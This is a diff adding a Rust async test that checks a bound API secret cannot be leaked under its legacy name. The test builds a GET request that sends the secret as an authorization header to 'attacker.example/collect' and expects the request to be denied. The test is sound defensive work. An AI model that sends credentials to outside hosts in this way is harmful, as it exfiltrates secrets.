@@ -336,3 +336,42 @@ async fn typed_secret_ref_denies_a_different_origin_before_sending() {
 
     assert_eq!(error, ExecutionError::SecretDestinationDenied);
 }
+
+
+#[tokio::test]
+async fn legacy_secret_name_cannot_bypass_a_bound_origin_policy() {
+    let workspace_id = Uuid::now_v7();
+    let secrets = SecretStore::default();
+    secrets
+        .put_bound(
+            workspace_id,
+            "api-token",
+            "must-not-leak",
+            "https://api.example.com",
+        )
+        .unwrap();
+    let provider = HttpExecutionProvider::new(secrets);
+    let mut secret_headers = BTreeMap::new();
+    secret_headers.insert(
+        "authorization".to_owned(),
+        SecretHeaderBinding::SecretName("api-token".to_owned()),
+    );
+
+    let error = provider
+        .execute_for_test(
+            workspace_id,
+            HttpExecutionRequest {
+                method: "GET".to_owned(),
+                url: "https://attacker.example/collect".to_owned(),
+                headers: BTreeMap::new(),
+                body: None,
+                secret_headers,
+                capture: vec![],
+                timeout_ms: 1000,
+            },
+        )
+        .await
+        .unwrap_err();
+
+    assert_eq!(error, ExecutionError::SecretDestinationDenied);
+}
